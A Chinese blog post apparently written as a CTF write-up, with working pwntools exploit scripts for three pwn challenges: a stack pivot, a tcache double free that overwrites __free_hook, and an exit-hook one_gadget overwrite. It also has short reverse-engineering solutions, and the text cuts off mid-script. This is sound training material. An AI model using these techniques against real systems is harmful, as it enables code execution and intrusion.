@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32gl-A.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16gl-A.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="中午前就做完了前两题，pwn1还拿了个三血，8错8错。下午又搞出一道蛮有意思的pwn。逆向就做了几道简单题。 PWNPWN1栈溢出。给了后门和 buf 的地址。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="长安战&quot;疫&quot;">
+<meta property="og:url" content="http://example.com/2022/01/08/cazy/index.html">
+<meta property="og:site_name" content="Anza | 学习记录">
+<meta property="og:description" content="中午前就做完了前两题，pwn1还拿了个三血，8错8错。下午又搞出一道蛮有意思的pwn。逆向就做了几道简单题。 PWNPWN1栈溢出。给了后门和 buf 的地址。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://c2.im5i.com/2022/01/08/UVdk7.png">
+<meta property="og:image" content="https://c2.im5i.com/2022/01/08/UVVIl.png">
+<meta property="og:image" content="https://c2.im5i.com/2022/01/08/UVr9P.png">
+<meta property="og:image" content="https://c2.im5i.com/2022/01/08/UVyaD.png">
+<meta property="og:image" content="https://c2.im5i.com/2022/01/08/UVJGj.png">
+<meta property="og:image" content="https://c2.im5i.com/2022/01/08/UdwUt.png">
+<meta property="og:image" content="https://c2.im5i.com/2022/01/08/UV7R2.png">
+<meta property="og:image" content="https://c2.im5i.com/2022/01/08/UVMpP.png">
+<meta property="og:image" content="https://c2.im5i.com/2022/01/08/UdvFm.png">
+<meta property="og:image" content="https://c2.im5i.com/2022/01/08/UdKjO.png">
+<meta property="og:image" content="https://c2.im5i.com/2022/01/08/UdfU4.png">
+<meta property="og:image" content="https://c2.im5i.com/2022/01/08/Udd6d.png">
+<meta property="og:image" content="https://c2.im5i.com/2022/01/08/UdliW.png">
+<meta property="og:image" content="https://c2.im5i.com/2022/01/09/Uf4aP.png">
+<meta property="article:published_time" content="2022-01-08T03:41:50.000Z">
+<meta property="article:modified_time" content="2023-01-18T08:09:10.533Z">
+<meta property="article:author" content="Anza">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://c2.im5i.com/2022/01/08/UVdk7.png">
+
+<link rel="canonical" href="http://example.com/2022/01/08/cazy/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>长安战"疫" | Anza | 学习记录</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Anza | 学习记录" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Anza | 学习记录</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/08/cazy/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Haida.png">
+      <meta itemprop="name" content="Anza">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Anza | 学习记录">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          长安战"疫"
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-01-08 11:41:50" itemprop="dateCreated datePublished" datetime="2022-01-08T11:41:50+08:00">2022-01-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-01-18 16:09:10" itemprop="dateModified" datetime="2023-01-18T16:09:10+08:00">2023-01-18</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/wp/" itemprop="url" rel="index"><span itemprop="name">wp</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>中午前就做完了前两题，pwn1还拿了个三血，8错8错。下午又搞出一道蛮有意思的pwn。逆向就做了几道简单题。</p>
+<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="PWN1"><a href="#PWN1" class="headerlink" title="PWN1"></a>PWN1</h3><p>栈溢出。给了后门和 buf 的地址。</p>
+<span id="more"></span>
+
+<p><img src="https://c2.im5i.com/2022/01/08/UVdk7.png" style="zoom:80%;" /><img src="https://c2.im5i.com/2022/01/08/UVVIl.png"></p>
+<p>以为是个简单的 ret2text ，但一直没打通，细看了下汇编，发现有坑。</p>
+<img src="https://c2.im5i.com/2022/01/08/UVr9P.png" style="zoom:67%;" />
+
+<p>可以看到 esp 在<code>ret</code>前被篡改了，其值就是 ecx-4 。gdb动调看一下，一直到ret为止，发现 ecx 就是我们的输入，因此可以控制 esp 即控制返回地址到栈上的后门函数地址。</p>
+<img src="https://c2.im5i.com/2022/01/08/UVyaD.png" style="zoom:80%;" />
+
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=remote(&quot;113.201.14.253&quot;,16088)</span></span><br><span class="line">io=process(<span class="string">&quot;./pwn1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">addr=<span class="built_in">int</span>(io.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;addr==&gt;&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line">payload=p32(<span class="number">0x8048540</span>)+p32(addr+<span class="number">4</span>)*<span class="number">15</span>	//返回到栈上的后门地址</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="PWN2"><a href="#PWN2" class="headerlink" title="PWN2"></a>PWN2</h3><p><code>show</code> 功能有个越界读，将 got 表地址泄露出来，计算偏移后便能拿到 libc 基址。</p>
+<img src="https://c2.im5i.com/2022/01/08/UVJGj.png" style="zoom: 80%;" />
+
+<p><code>add</code> 功能有个<code>off-by-null</code>漏洞，直接打模板进行 double free 即可，不过要注意的是 tcache 对 double free 的检查，在进行 double free 前需要将目标chunk的 bk 指针置零。</p>
+<img src="https://c2.im5i.com/2022/01/08/UdwUt.png" style="zoom:80%;" />
+
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=remote(<span class="string">&quot;113.201.14.253&quot;</span>,<span class="number">16066</span>)</span><br><span class="line"><span class="comment">#io=process(&quot;./pwn2&quot;)</span></span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendafter(<span class="string">&quot;content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">show(-<span class="number">33</span>)</span><br><span class="line">leak=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;leak_addr====&gt;&quot;</span>+<span class="built_in">hex</span>(leak))</span><br><span class="line">libc_base=leak-libc.sym[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base====&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0xf8</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x80</span>+p64(<span class="number">0x90</span>+<span class="number">0x100</span>))</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0xf8</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">&quot;cccc&quot;</span>)</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">&quot;dddd&quot;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">edit(<span class="number">9</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0x88</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0x88</span>,p64(system))</span><br><span class="line"></span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="PWN3"><a href="#PWN3" class="headerlink" title="PWN3"></a>PWN3</h3><p>后门的前提是打过boss，需要 level 足够大。level 代表a数组的长度，储存在 a数组的第37位，但 level 单一个字节不能大于35。我们发现连接方式为<code>strncat</code>，会自动在结尾添 ‘\x00’。只要我们将 a数组填至36位，原 level 就会置零，使得 level 最后只是 level_up 里我们输入的值，因此在下次level_up时可以绕过判断，继续升级。</p>
+<img src="https://c2.im5i.com/2022/01/08/UV7R2.png" style="zoom:80%;" />
+
+<p>一次性的任意写后门，但它只给了 libc 上的地址，而且开了 pie，所以不能打 got表劫持，只能打 exit 函数调用的指针 &lt;_rtld_global+3848&gt; 来修改 rip 为 one_gadget。</p>
+<img src="https://c2.im5i.com/2022/01/08/UVMpP.png" style="zoom:80%;" />
+
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=remote(&quot;113.201.14.253&quot;, 16033)</span></span><br><span class="line">io=process(<span class="string">&quot;./Gpwn3&quot;</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">level</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;You choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Give me a character level :\n&quot;</span>,<span class="built_in">str</span>(level))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">levelup</span>(<span class="params">level</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;You choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Give me another level :\n&quot;</span>,<span class="built_in">str</span>(level))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_game</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;You choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">create(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">levelup(<span class="string">&#x27;a&#x27;</span>*<span class="number">28</span>)</span><br><span class="line">levelup(<span class="string">&#x27;a&#x27;</span>*<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">start_game()</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">start_game()</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">puts_addr=<span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">libc_base=puts_addr-libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">exit_backdoor=libc_base+<span class="number">0x5f0f48</span></span><br><span class="line">log.success(<span class="string">&quot;exit_backdoor===&gt;&quot;</span>+<span class="built_in">hex</span>(exit_backdoor))</span><br><span class="line"></span><br><span class="line">one_gadget=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">backdoor=one_gadget[<span class="number">3</span>]+libc_base</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;Warrior,please leave your name:&#x27;</span>,p64(exit_backdoor))</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendafter(<span class="string">&quot;We&#x27;ll have a statue made for you!&quot;</span>,p64(backdoor))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="RE1"><a href="#RE1" class="headerlink" title="RE1"></a>RE1</h3><p>两种方法：</p>
+<ol>
+<li>简单的移位后可以得出flag</li>
+<li>分割数字转为字符</li>
+</ol>
+<img src="https://c2.im5i.com/2022/01/08/UdvFm.png" style="zoom:80%;" />
+
+<p>脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">r=<span class="string">&#x27;Jr_j11y_s1tug_g0_raq_g0_raq_pnml&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> r:</span><br><span class="line">    c1=<span class="built_in">ord</span>(i)-<span class="number">13</span></span><br><span class="line">    c2=<span class="built_in">ord</span>(i)+<span class="number">13</span></span><br><span class="line">    <span class="keyword">if</span> (c1&gt;=<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) <span class="keyword">and</span> c1&lt;=<span class="built_in">ord</span>(<span class="string">&#x27;m&#x27;</span>)) <span class="keyword">or</span> (c1&gt;=<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) <span class="keyword">and</span> c1&lt;=<span class="built_in">ord</span>(<span class="string">&#x27;M&#x27;</span>)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(c1),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> (c2&gt;=<span class="built_in">ord</span>(<span class="string">&#x27;n&#x27;</span>) <span class="keyword">and</span> c1&lt;=<span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>)) <span class="keyword">or</span> (c2&gt;=<span class="built_in">ord</span>(<span class="string">&#x27;N&#x27;</span>) <span class="keyword">and</span> c2&lt;=<span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(c2),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(i,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">f=<span class="string">&quot;87,101,95,119,49,49,108,95,102,49,103,104,116,95,116,48,95,101,110,100,95,116,48,95,101,110,100,95,99,97,122,121&quot;</span></span><br><span class="line">k=f.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> k:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(i)),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>结果</p>
+<img src="https://c2.im5i.com/2022/01/08/UdKjO.png" style="zoom:67%;" />
+
+<h3 id="RE2"><a href="#RE2" class="headerlink" title="RE2"></a>RE2</h3><p>字符串中发现这一串比较特殊，直接base64解码，拿到flag。</p>
+<img src="https://c2.im5i.com/2022/01/08/UdfU4.png" style="zoom: 67%;" />
+
+<p>结果</p>
+<img src="https://c2.im5i.com/2022/01/08/Udd6d.png" style="zoom:67%;" />
+
+<h3 id="RE3"><a href="#RE3" class="headerlink" title="RE3"></a>RE3</h3><p>直接在线网站进行一波反编译</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_1</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    <span class="keyword">if</span> num &gt;= <span class="number">0</span>:</span><br><span class="line">        flag[num] = flag[num] ^ num</span><br><span class="line">        num -= <span class="number">1</span></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> num &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_2</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    <span class="keyword">if</span> num &gt;= <span class="number">0</span>:</span><br><span class="line">        flag[num] = flag[num] ^ flag[num + <span class="number">1</span>]</span><br><span class="line">        num -= <span class="number">1</span></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> num &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">Happy = [</span><br><span class="line">    <span class="number">44</span>,</span><br><span class="line">    <span class="number">100</span>,</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    <span class="number">50</span>,</span><br><span class="line">    <span class="number">106</span>,</span><br><span class="line">    <span class="number">90</span>,</span><br><span class="line">    <span class="number">5</span>,</span><br><span class="line">    <span class="number">102</span>,</span><br><span class="line">    <span class="number">10</span>,</span><br><span class="line">    <span class="number">112</span>]</span><br><span class="line">num = <span class="number">9</span></span><br><span class="line">f = <span class="built_in">input</span>(<span class="string">&#x27;Please input your flag:&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(f) != <span class="number">10</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Your input is illegal&#x27;</span>)</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line">flag = <span class="built_in">list</span>(f)</span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span 